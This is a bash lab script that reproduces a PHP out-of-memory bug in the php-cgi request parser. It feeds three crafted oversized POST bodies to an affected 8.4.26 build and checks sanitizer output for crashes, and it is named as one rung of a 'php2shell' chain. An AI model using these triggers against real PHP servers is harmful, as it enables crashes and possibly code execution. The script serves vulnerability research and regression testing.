#!/bin/bash
# php2shell rung-2 trigger — OOM during request parsing (php-cgi SAPI).
#
# Ports the vendor's own regression recipe (Zend/tests/oom_request_parsing.phpt
# from the FIXED 8.4.27 tree, commit 3584a98) onto the AFFECTED build:
# php-cgi, memory_limit=8M, post_max_size=1G, max_input_vars=10000000, and
# three POST bodies that OOM while PHP parses the request at startup —
# before any user code runs. On 8.4.26 we look for sanitizer reports or
# crashes at request shutdown; on 8.4.27 the vendor expects a clean
# "Allowed memory size ... exhausted" fatal error.
#
# Usage: bash lab/repro/php2shell-rung2-oom-cgi.sh <path-to-php-cgi> [outdir]
#
# "memory_limit" only applies to the stock ZEND allocator: with
# USE_ZEND_ALLOC=0 the limit is not enforced (observed: no OOM, exit 0), so
# the OOM trigger runs with the stock ZEND allocator; ASan stays linked but
# cannot observe inside ZEND-mm pools — that label is part of any claim.
# Follow-up experiment: USE_ZEND_ALLOC=0 + RLIMIT_AS (forces malloc/mmap
# failure, which per the advisory also reaches the vulnerable longjmp).

set -u
CGI=$1
OUT=${2:-lab/build/evidence}
mkdir -p "$OUT"
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

run_env() {
    # shellcheck disable=SC2016
    ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    UBSAN_OPTIONS=halt_on_error=1 \
    REQUEST_METHOD=POST \
    CONTENT_TYPE=application/x-www-form-urlencoded \
    CONTENT_LENGTH=$2 \
    SCRIPT_FILENAME="$TMP/target.php" \
    REDIRECT_STATUS=1 \
    "$CGI" -n -d memory_limit=8M -d post_max_size=1G \
        -d max_input_vars=10000000 -d html_errors=0 \
        < "$1" > "$3" 2>&1
    echo "exit=$?" >> "$3"
}

printf '<?php\n?>' > "$TMP/target.php"

# Shape 1: one 6MB value with no '&' — add_post_vars() never completes a
# variable; only the read loop notices the limit.
python3 -c "print('a=' + 'x'*6*1024*1024, end='')" > "$TMP/one.bin"

# Shape 2: 200k small variables — the limit is hit while registering them.
python3 -c "print('&'.join(f'k{i}=v{i}' for i in range(200000)), end='')" > "$TMP/many.bin"

# Shape 3: 3MB value + 100k small vars — each half fits, the pair doesn't.
python3 -c "print('a=' + 'x'*3*1024*1024 + '&' + '&'.join(f'k{i}=v{i}' for i in range(100000)), end='')" > "$TMP/mixed.bin"

i=0
for shape in one many mixed; do
    i=$((i+1))
    body="$TMP/$shape.bin"
    len=$(stat -c%s "$body")
    echo "== shape $shape (${len}B) =="
    run_env "$body" "$len" "$OUT/rung2-cgi-$shape.out"
    tail -5 "$OUT/rung2-cgi-$shape.out" | sed 's/^/    /'
done

grep -lE 'AddressSanitizer|runtime error|SEGV|Assertion|SUMMARY' "$OUT"/rung2-cgi-*.out \
    && echo "SANITIZER/CRASH SIGNALS FOUND — see $OUT" \
    || echo "no sanitizer report in any shape (negative result — record it)"
